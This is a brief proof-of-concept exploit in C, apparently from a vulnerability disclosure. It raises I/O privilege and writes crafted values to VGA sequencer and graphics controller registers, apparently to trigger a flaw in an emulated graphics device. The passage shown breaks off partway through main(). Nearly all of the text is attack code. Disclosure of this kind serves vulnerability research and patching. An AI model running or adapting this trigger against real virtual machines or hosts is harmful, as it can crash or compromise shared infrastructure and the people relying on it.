FYI

The PoC for this is below:

*/
#include <sys/io.h>
#include <stdio.h>

void write_sr(int idx,int val)
{
      outb(idx,0x3c4);
	outb(val,0x3c5);
}
void write_gr(int idx,int val)
{
	outb(idx,0x3ce);
	outb(val,0x3cf);
}


int main()
{
	iopl(3);
	write_sr(0x07,1);
	write_gr(0x31,0x80);
	write_gr(0x26,0xff);
	write_gr(0x27,0xff);
	write_gr(0x24,1);
	write_gr(0x20,0xff);
	write_gr(0x21,0xff);
	write_gr(0x22,0x0);
	write_gr(0x23,0x0);

	write_gr(0x28,0);
	write_gr(0x29,0);
	write_gr(0x2a,0);
	write_gr(0x2c,0xff);
